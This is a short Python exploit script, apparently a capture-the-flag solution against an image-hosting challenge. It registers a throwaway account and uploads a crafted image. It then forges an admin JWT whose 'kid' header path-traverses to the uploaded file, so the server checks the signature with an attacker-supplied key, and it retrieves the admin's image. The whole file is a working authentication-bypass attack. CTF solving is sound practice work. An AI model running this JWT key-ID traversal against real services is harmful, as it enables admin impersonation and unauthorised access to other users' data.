import shutil
import re
import jwt
import requests
import os

#URL = "http://localhost:6060"
URL = "http://imagehost.hammer.b01le.rs"
USERNAME = os.urandom(16).hex()
PASSWORD = os.urandom(16).hex()

session = requests.Session()
session.post(URL + "/register", data={"user": USERNAME, "password": PASSWORD})

resp = session.post(URL, files={"image": open("solve.png", "rb")}).text
uploaded_filename = re.search(r'<img src="/view/([^"]+)"', resp).group(1)

token = jwt.encode(
	{
	"user_id": 1,
	"admin": True
	},
	key=open("private_key.pem", "rb").read(),
	algorithm="RS256",
	headers={"kid": "../uploads/" + uploaded_filename}
)

resp = session.get(URL, cookies={"session": token}).text
image = re.search(r'<img src="(/view/[^"]+)"', resp).group(1)
with open("out.png", "wb") as f:
	f.write(session.get(URL + image).content)
